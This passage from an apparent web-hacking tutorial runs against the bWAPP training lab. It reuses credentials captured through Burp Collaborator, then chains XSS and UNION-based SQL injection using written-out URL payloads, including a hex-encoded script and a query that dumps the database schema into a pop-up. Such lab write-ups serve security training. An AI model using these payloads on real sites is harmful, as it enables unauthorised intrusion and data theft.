<p><span style="color: #000000;">Over at the top of the blog, there was an account login section, let’s check it there.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-U_m4A9qlXXk/XzcGAa-zJBI/AAAAAAAAnRA/JgWXal4G1MgWbD-QrCNBB2aZh_xMwbgSgCLcBGAsYHQ/s1600/121.png"/></p>
<p><span style="color: #000000;">Cool!! Let’s try to make a dry run over here. Tune in your <strong>proxy</strong> and capture up the ongoing <strong>HTTP</strong> <strong>Request</strong>.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-yqsu-AFVzjE/XzcGKMNcXjI/AAAAAAAAnRI/VtfuYgS2_BMyIJrWW8g0ZxCnvVWobo61gCLcBGAsYHQ/s1600/122.png"/></p>
<p><span style="color: #000000;">Okay !! Let’s manipulate the username and password with the one we captured earlier in the <strong>Burp Collaborator.</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Mr0twymE8KI/XzcGRWlQrlI/AAAAAAAAnRU/XuA7WsyYEqkCfnVW_DHiIH9-69_PtCWEQCLcBGAsYHQ/s1600/123.png"/></p>
<p><span style="color: #000000;">Great!! Now simply hit the <strong>Forward</strong> button and there you go….</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-CPIEoEnRTJE/XzcGWVkZe7I/AAAAAAAAnRY/1Sm7r9ifW5Ymf9x3d7ZDY-JcdpvTxHZSQCLcBGAsYHQ/s1600/124.png"/></p>
<h3><span style="color: #800000;">XSS to SQL Injection</span></h3>
<p><span style="color: #000000;">So up till now, we were only discussing, how an attacker could capture up the authenticated cookies, the visitor’s credentials and even the server’s remote shell. But what<em>, if I say that he can even dump the complete database of the web-application over in the single pop-up? </em>Wonder how? Let’s find it out in this section.</span></p>
<p><span style="color: #000000;">Over in the vulnerable application, the attacker was encountered with a web-page which was suffering from the SQL Injection vulnerability.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-usHDbrTvvIw/Xz5rmW_4-TI/AAAAAAAAneM/v2IDkJ1AsH0Yzc9bSYEAtiDfNOAfENUVACLcBGAsYHQ/s1600/700.png"/></p>
<p><span style="color: #000000;">Therefore in order to grab up the result more precise, he checked the total number of columns with the <strong>“order by”</strong> clause.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.0.14/bWAPP/sqli_1.php?title=’order by 7--+&amp;action=search</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-RBs76C4drhk/Xz5rpKLT_DI/AAAAAAAAneQ/51xKae7beBkPqWlRbCyYk7jt5ddWa_KfgCLcBGAsYHQ/s1600/701.png"/></p>
<p><span style="color: #000000;">As he was then confirmed by the total columns, he thus used the <strong>UNION</strong> <strong>operator</strong> with the <strong>SELECT</strong> <strong>query</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.0.14/bWAPP/sqli_1.php?title=’ union select 1,2,3,4,5,6,7--+&amp;action=search</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-YrrTt4HwlLA/Xz5rsf8OJuI/AAAAAAAAneU/zbJkR4P3Wz0Yqp3avmgDzhqIXV21vyMpgCLcBGAsYHQ/s1600/702.png"/></p>
<p><span style="color: #000000;">Great!! This was all he wanted, the printed value. From the above image, you can see that <strong>“2” </strong>has been displayed on the screen.</span></p>
<p><span style="color: #000000;">It’s time to check this for XSS. But he can’t inject his Javascript code like the same he used to, therefore he’ll thus convert it all into the <strong>“HEX string” </strong>and then he’ll manipulate <strong>“2” </strong>with the <strong>hex-value.</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">0x3c7363726970743e616c657274282253514c20496e6a656374696f6e207669612058535322293c2f7363726970743e</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Abauuvrm-iE/Xz5rv3Y-CTI/AAAAAAAAneY/Uxs_H70hTVoZx26MG8sqB-zwlN-ZdurWACLcBGAsYHQ/s1600/703.png"/></p>
<p><span style="color: #000000;">Cool!! It’s working. <em>Now he can add any script, whether it is for cookie capturing or the remote shell one. But for this time, he’ll <strong>dump up the database, its tables and the fields.</strong></em></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.0.14/bWAPP/sqli_1.php?title=%27%20union%20select%201,concat(0x3c7363726970743e616c657274282249474e49544520544543484e4f4c4f47494553,0x5c6e,(concat(@x:=0x00,(SELECT%20count(*)from%20information_schema.columns%20where%20table_schema=database()%20and%20@x:=concat(@x,0x5c6e,database(),0x20207c2020,table_name,0x20207c2020,column_name)),@x)),0x22293c2f7363726970743e),3,4,5,6,7--+&amp;action=search</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-yRds6ydaiwc/Xz5r2VW6zRI/AAAAAAAAneg/lOyzdpmK320A7mJqf1C-8S3J9maGl10SACLcBGAsYHQ/s1600/704.png"/></p>
<p><span style="color: #000000;">Great!! From the below image, you can see that the complete database structure has been presented in front of us</span>.</p>
<p><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
<p><b>Author</b>: Geet Madan is a Certified Ethical Hacker, Researcher and Technical Writer at Hacking Articles on Information Security<b>. </b>Contact <a href="https://www.linkedin.com/in/geet-madan/"><b>here</b></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
